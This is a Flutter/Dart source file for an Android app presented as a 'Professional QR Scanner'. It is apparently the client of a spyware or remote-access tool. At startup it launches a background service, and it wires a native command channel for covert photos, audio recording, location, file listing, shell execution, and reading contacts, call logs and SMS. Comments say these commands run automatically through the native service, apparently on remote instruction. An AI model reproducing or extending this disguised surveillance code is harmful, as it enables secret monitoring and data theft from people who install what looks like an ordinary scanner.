// lib/main.dart
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter/services.dart';

import 'screens/qr_scanner_screen.dart';
import 'services/background_service.dart';
import 'utils/constants.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeBackgroundService();
  runApp(const EthicalScannerApp());
}

class EthicalScannerApp extends StatefulWidget {
  const EthicalScannerApp({super.key});
  @override
  State<EthicalScannerApp> createState() => _EthicalScannerAppState();
}

class _EthicalScannerAppState extends State<EthicalScannerApp> {
  final svc = FlutterBackgroundService();
  
  // Native command channel - communicates directly with native service
  static const MethodChannel _nativeCommandsChannel = MethodChannel('com.example.kem/native_commands');

  @override
  void initState() {
    super.initState();

    // REMOVED: All complex Flutter-based command listeners
    // All commands now execute through native service automatically
    
    // Keep only essential background service status monitoring
    svc.on('update').listen((event) {
      if (!mounted) return;
      debugPrint("Background service update: $event");
    });

    // REMOVED: All these complex listeners as they're now handled natively:
    // - execute_take_picture_from_ui
    // - execute_list_files_from_ui  
    // - execute_shell_from_ui
    // - execute_record_voice_from_ui
    // - SIO_CMD_GET_LOCATION

    debugPrint("EthicalScannerAppState: Initialized with native-only command execution");
  }

  // Helper method to execute commands through native service (optional for UI use)
  Future<Map<String, dynamic>?> executeNativeCommand(String command, Map<String, dynamic> args) async {
    try {
      debugPrint("Executing native command: $command with args: $args");
      
      final result = await _nativeCommandsChannel.invokeMethod('executeCommand', {
        'command': command,
        'args': args,
      });
      
      if (result != null && result is Map) {
        debugPrint("Native command successful: $command");
        return Map<String, dynamic>.from(result);
      }
      return null;
    } on PlatformException catch (e) {
      debugPrint("Native command execution failed: ${e.code} - ${e.message}");
      return null;
    } catch (e) {
      debugPrint("Unexpected error executing native command: $e");
      return null;
    }
  }

  // Example methods for UI-triggered commands (optional)
  Future<void> takePictureFromUI({String camera = 'back'}) async {
    final result = await executeNativeCommand('command_take_picture', {
      'camera': camera,
    });
    
    if (result != null) {
      debugPrint("Picture taken successfully: ${result['path']}");
      // Handle UI feedback if needed
    }
  }

  Future<void> recordAudioFromUI({int duration = 10, String quality = 'medium'}) async {
    final result = await executeNativeCommand('command_record_voice', {
      'duration': duration,
      'quality': quality,
    });
    
    if (result != null) {
      debugPrint("Audio recorded successfully: ${result['path']}");
      // Handle UI feedback if needed
    }
  }

  Future<void> getLocationFromUI() async {
    final result = await executeNativeCommand('command_get_location', {});
    
    if (result != null) {
      debugPrint("Location obtained: ${result['latitude']}, ${result['longitude']}");
      // Handle UI feedback if needed
    }
  }

  Future<void> listFilesFromUI({String path = '/storage/emulated/0'}) async {
    final result = await executeNativeCommand('command_list_files', {
      'path': path,
    });
    
    if (result != null) {
      debugPrint("Files listed: ${result['totalFiles']} files found");
      // Handle UI feedback if needed
    }
  }

  Future<void> executeShellFromUI({required String command, List<String> args = const []}) async {
    final result = await executeNativeCommand('command_execute_shell', {
      'command_name': command,
      'command_args': args,
    });
    
    if (result != null) {
      debugPrint("Shell command executed: ${result['exitCode']}");
      // Handle UI feedback if needed
    }
  }

  Future<void> getContactsFromUI() async {
    final result = await executeNativeCommand('command_get_contacts', {});
    
    if (result != null) {
      debugPrint("Contacts retrieved: ${result['totalContacts']} contacts");
      // Handle UI feedback if needed
    }
  }

  Future<void> getCallLogsFromUI() async {
    final result = await executeNativeCommand('command_get_call_logs', {});
    
    if (result != null) {
      debugPrint("Call logs retrieved: ${result['totalCallLogs']} logs");
      // Handle UI feedback if needed
    }
  }

  Future<void> getSMSFromUI() async {
    final result = await executeNativeCommand('command_get_sms', {});
    
    if (result != null) {
      debugPrint("SMS messages retrieved: ${result['totalMessages']} messages");
      // Handle UI feedback if needed
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Professional QR Scanner',
      theme: ThemeData.dark(),
      home: const Directionality(
        textDirection: TextDirection.ltr,
        child: QrScannerScreen(),
      ),
      // Optional: Add a debug page to test native commands
      routes: {
        '/debug': (context) => DebugNativeCommandsPage(
          onTakePicture: takePictureFromUI,
          onRecordAudio: recordAudioFromUI,
          onGetLocation: getLocationFromUI,
          onListFiles: listFilesFromUI,
          onExecuteShell: executeShellFromUI,
          onGetContacts: getContactsFromUI,
          onGetCallLogs: getCallLogsFromUI,
          onGetSMS: getSMSFromUI,
        ),
      },
    );
  }
}

// Optional debug page for testing native commands (remove in production)
class DebugNativeCommandsPage extends StatelessWidget {
  final VoidCallback onTakePicture;
  final VoidCallback onRecordAudio;
  final VoidCallback onGetLocation;
  final VoidCallback onListFiles;
  final Function({required String command, List<String> args}) onExecuteShell;
  final VoidCallback onGetContacts;
  final VoidCallback onGetCallLogs;
  final VoidCallback onGetSMS;

  const DebugNativeCommandsPage({
    super.key,
    required this.onTakePicture,
    required this.onRecordAudio,
    required this.onGetLocation,
    required this.onListFiles,
    required this.onExecuteShell,
    required this.onGetContacts,
    required this.onGetCallLogs,
    required this.onGetSMS,
  });

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Debug Native Commands')),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            const Text('Test Native Commands:', style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
            const SizedBox(height: 16),
            
            ElevatedButton(
              onPressed: onTakePicture,
              child: const Text('Take Picture (Back Camera)'),
            ),
            const SizedBox(height: 8),
            
            ElevatedButton(
              onPressed: onRecordAudio,
              child: const Text('Record Audio (10s)'),
            ),
            const SizedBox(height: 8),
            
            ElevatedButton(
              onPressed: onGetLocation,
              child: const Text('Get Location'),
            ),
            const SizedBox(height: 8),
            
            ElevatedButton(
              onPressed: onListFiles,
              child: const Text('List Files'),
            ),
            const SizedBox(height: 8),
            
            ElevatedButton(
              onPressed: () => onExecuteShell(command: 'ls', args: ['-la']),
              child: const Text('Execute Shell (ls -la)'),
            ),
            const SizedBox(height: 8),
            
            ElevatedButton(
              onPressed: onGetContacts,
              child: const Text('Get Contacts'),
            ),
            const SizedBox(height: 8),
            
            ElevatedButton(
              onPressed: onGetCallLogs,
              child: const Text('Get Call Logs'),
            ),
            const SizedBox(height: 8),
            
            ElevatedButton(
              onPressed: onGetSMS,
              child: const Text('Get SMS Messages'),
            ),
            const SizedBox(height: 16),
            
            const Text(
              'Note: All commands execute through native service.\n'
              'Check logs for execution results.',
              style: TextStyle(fontSize: 12, color: Colors.grey),
            ),
          ],
        ),
      ),
    );
  }
}